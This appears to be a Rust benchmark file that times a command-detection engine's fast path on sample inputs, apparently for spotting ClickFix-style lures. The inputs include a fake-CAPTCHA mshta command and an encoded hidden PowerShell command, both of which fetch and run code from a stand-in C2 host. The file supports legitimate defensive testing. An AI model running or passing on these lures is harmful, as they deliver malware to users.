use cfx_engine::{DomainClass, Engine, Observation, Origin, Target};
use criterion::{criterion_group, criterion_main, Criterion};
use std::hint::black_box;

fn bench(c: &mut Criterion) {
    let engine = Engine::default();
    let cases = [
        ("benign_docker", Observation::new("docker run --rm -it -v $PWD:/src -w /src -e RUST_LOG=debug --network host rust:1.80 cargo build --release")),
        ("lumma_mshta", Observation::new("mshta https://c2.invalid/verify.mp4 # I am not a robot - reCAPTCHA Verification ID: 2165")
            .origin(Origin::Browser { url: None, domain_class: DomainClass::Unknown }).target(Target::RunDialog)),
        ("encoded_command", Observation::new("powershell -w h -enc aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcABzADoALwAvAGMAMgAuAGkAbgB2AGEAbABpAGQALwBhACkA")),
        ("jwt", Observation::new("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")),
    ];
    for (name, obs) in &cases {
        c.bench_function(&format!("fast_path/{name}"), |b| {
            b.iter(|| engine.fast_path(black_box(obs)))
        });
    }
}

criterion_group!(benches, bench);
criterion_main!(benches);
